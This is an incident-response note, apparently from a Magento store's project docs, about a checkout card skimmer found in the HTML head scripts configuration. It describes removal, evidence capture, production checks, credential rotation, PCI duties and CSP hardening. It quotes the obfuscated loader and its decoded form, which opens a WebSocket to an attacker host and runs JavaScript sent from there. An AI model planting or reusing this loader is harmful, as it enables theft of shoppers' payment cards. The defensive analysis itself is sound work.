# 07 — Checkout skimmer in the head scripts

Found 2026-09-25 during the homepage performance work (`06`). **Removed from
this copy. Production has not been checked**: this database is a copy of it, so
production should be assumed infected until someone checks its database
directly.

## What it is

`core_config_data` row `config_id` 638 holds `design/head/includes` at scope
`stores`/`1`. This is the store's *Content → Design → HTML Head → Scripts and
Style Sheets* field, rendered into `<head>` on every page. After the
legitimate GA4 tag and the Google site-verification `<meta>`, it contained:

```html
<script>var soc;if(new RegExp("securecheckout").test(window.location))new self["Function"||"Object"](atob('c29jPW5ldyBzZWxm…')).call(this);</script>
```

The base64 decodes to:

```js
soc=new self.WebSocket("wss://finteza.online/api/id/result");
soc.onmessage=function(a){new self.Function(atob(a.data)).call(this)};
```

On any URL containing `securecheckout`, it opens a WebSocket to the attacker
and executes whatever JavaScript the attacker sends. This store's one-step
checkout is served at `/securecheckout` (`osc/general/route`), so the loader
runs exactly where customers type card details. The attacker's server supplies
the actual skimming code, so it can change at any time and never touches the
database.

| | |
|---|---|
| Indicator | `wss://finteza.online/api/id/result` |
| Where | `core_config_data` 638, `design/head/includes`, `stores`/`1` |
| Row last changed | `2020-05-01 20:41:00`. Unreliable: attackers can set it, and restores preserve it |
| Also checked | all `core_config_data` values, `cms_block`, `cms_page`: clean. The 6 other rows containing `<script>` are legitimate (Google Ads conversion, Magepow lazy-load, Google Maps embed, slider page) |
| In the codebase? | No. The payload is in no file outside `vendor/`, `var/`, `generated/` and `pub/` |
| CSP | Would not have stopped it. On 2.4.6 `Magento_Csp` was disabled. On 2.4.9 it is report-only with no report URI, so no violation reports exist either |

## What was done here

```bash
php shell/10-remove-checkout-skimmer.php            # report: found 1 row, exit 1
php shell/10-remove-checkout-skimmer.php --apply    # evidence, strip, clear caches, verify
```

- Evidence is in `var/backups/skimmer-evidence-20260925-153120/`:
  - the exact original value, SHA-256
    `3f02db5165a93afd9a2ad743e143999c975c3c6c5ea285b7fd2e4be38147827a`
  - `findings.json`, with the removed block, decoded payload and indicator
- Only the malicious `<script>` was removed. The GA4 tag and `<meta>` are
  byte-for-byte unchanged, CRLF line endings included. The row went from 705 to
  395 bytes.
- Verified afterwards:
  - a re-run reports clean
  - freshly rendered `/` and `/securecheckout` contain no payload, and GA4
    still loads

## Production — what needs doing

The script is safe to run there: it reports by default and only writes with
`--apply`. Check the database itself. `curl` against `marytylor.com` gets a
403 from the bot protection, so an outside check proves nothing.

1. **Check now.** Run `php shell/10-remove-checkout-skimmer.php`, or
   `SELECT config_id, value FROM core_config_data WHERE path = 'design/head/includes';`
2. **If present, remove it** with `--apply`, and keep the evidence directory it
   writes.
3. **Close the way in.** Removing the script does not remove the attacker's
   access. Production runs 2.4.6, which is unpatched for the
   exploited-in-the-wild CVE-2026-75650 (`doc/04`) and probably older ones.
   Likely routes are an exploited vulnerability or a stolen admin login. Check:
   - `admin_user` for accounts nobody recognises, and recent `logdate`s
   - integrations and OAuth tokens (`integration`, `oauth_token`)
   - files changed outside deploys, especially `pub/`, `app/`, and any PHP in
     `pub/media`
   - cron jobs, and other script-bearing config
     (`design/footer/absolute_footer`, `design/head/*`)
4. **Rotate everything the attacker could have read:**
   - admin passwords
   - the database password
   - API and integration tokens
   - payment-gateway credentials (Authorize.net / `Rootways_Authorizecim`)
   - SMTP
   - the Magento encryption key

   The credentials committed to git (see the security debt list in `CLAUDE.md`)
   are already considered compromised.
5. **Treat it as a card-data incident.** The skimmer targets the payment page,
   and it is unknown how long it has been live. Contact the payment processor
   or acquirer about their incident procedure (PCI DSS). The business may also
   have customer-notification obligations; that is a legal question, not a
   technical one.
6. **Harden the payment page.** PCI DSS 4.0 requires an inventory of the
   scripts on payment pages and detection of changes to them (6.4.3, 11.6.1).
   Enforce CSP on the checkout route. Magento's default restrict mode covers
   `checkout_index_index`, not Mageplaza's `/securecheckout` handle, and
   `connect-src` without `finteza.online` would have blocked this WebSocket.
   Run `shell/10-remove-checkout-skimmer.php` on a schedule as a tamper check:
   it exits 1 if the pattern comes back.
